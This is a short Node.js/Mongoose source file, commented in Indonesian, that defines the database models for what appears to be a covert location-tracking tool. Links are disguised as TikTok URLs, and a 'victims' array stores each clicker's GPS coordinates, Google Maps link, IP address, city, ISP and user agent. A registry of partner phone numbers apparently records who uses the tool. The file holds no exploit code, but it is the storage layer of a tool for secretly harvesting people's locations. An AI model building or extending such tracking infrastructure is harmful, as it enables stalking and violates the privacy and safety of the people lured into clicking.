const mongoose = require('mongoose');
require('dotenv').config();

// Koneksi ke MongoDB
const connectDB = async () => {
    try {
        await mongoose.connect(process.env.MONGODB_URI, {
            useNewUrlParser: true,
            useUnifiedTopology: true
        });
        console.log('✅ MongoDB Connected');
    } catch (error) {
        console.error('❌ MongoDB Error:', error);
        process.exit(1);
    }
};

// Schema untuk Partner
const partnerSchema = new mongoose.Schema({
    number: { type: String, required: true, unique: true },
    name: { type: String, default: 'Partner' },
    addedBy: { type: String, required: true },
    addedAt: { type: Date, default: Date.now },
    isActive: { type: Boolean, default: true }
});

// Schema untuk Tracking Links
const linkSchema = new mongoose.Schema({
    uniqueId: { type: String, required: true, unique: true },
    tiktokUrl: { type: String, required: true },
    createdBy: { type: String, required: true },
    createdAt: { type: Date, default: Date.now },
    clicks: { type: Number, default: 0 },
    victims: [{
        timestamp: Date,
        lat: Number,
        lng: Number,
        accuracy: Number,
        googleMapsLink: String,
        source: String,
        ip: String,
        city: String,
        country: String,
        isp: String,
        userAgent: String
    }]
});

const Partner = mongoose.model('Partner', partnerSchema);
const Link = mongoose.model('Link', linkSchema);

module.exports = { connectDB, Partner, Link };